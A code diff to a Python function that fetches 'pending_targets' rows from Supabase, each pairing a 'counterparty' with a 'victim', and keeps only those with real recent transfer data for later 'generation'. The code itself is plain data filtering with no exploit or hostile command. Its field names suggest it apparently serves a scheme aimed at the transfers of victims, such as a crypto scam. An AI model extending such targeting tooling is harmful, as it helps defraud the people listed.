@@ -213,13 +213,16 @@ def load_processed_pairs():
         return set()
 
 def fetch_pending_pairs():
-    """Fetch all unprocessed pairs from pending_targets table using pagination."""
+    """Fetch all unprocessed pairs from pending_targets table using pagination.
+    Only returns targets that have REAL transfer data (amount + asset + block).
+    """
     if not supabase:
         return []
     try:
         all_rows = []
         page_size = 1000
         start = 0
+        skipped_no_data = 0
         
         while True:
             result = supabase.table('pending_targets')\
@@ -241,20 +244,41 @@ def fetch_pending_pairs():
                 
             start += page_size
 
-        return [
-            (
+        # 🚀 FILTER: Only keep targets that have REAL transfer data
+        valid_pairs = []
+        for row in all_rows:
+            amount = row.get('last_transfer_amount')
+            asset = row.get('last_transfer_asset')
+            block = row.get('last_transfer_block')
+            
+            # Skip targets with missing/empty transfer data
+            if not amount or not asset or not block:
+                skipped_no_data += 1
+                continue
+            
+            # Extra safety: skip if amount is literally "0" or "0x0"
+            amount_str = str(amount).strip()
+            if amount_str in ('0', '0x0', '0.0', ''):
+                skipped_no_data += 1
+                continue
+                
+            valid_pairs.append((
                 row['id'],
                 row['counterparty'].lower(),
                 row['victim'].lower(),
                 {
                     'last_transfer_date': row.get('last_transfer_date'),
-                    'last_transfer_amount': row.get('last_transfer_amount'),
-                    'last_transfer_asset': row.get('last_transfer_asset'),
-                    'last_transfer_block': row.get('last_transfer_block'),
+                    'last_transfer_amount': amount,
+                    'last_transfer_asset': asset,
+                    'last_transfer_block': block,
                 }
-            )
-            for row in all_rows
-        ]
+            ))
+        
+        if skipped_no_data > 0:
+            logger.info(f"⏭️ Skipped {skipped_no_data} targets with no real transfer data")
+        logger.info(f"✅ {len(valid_pairs)} targets with valid transfer data ready for generation")
+        
+        return valid_pairs
     except Exception as e:
         logger.error(f"Failed to fetch pending pairs: {e}")
         return []
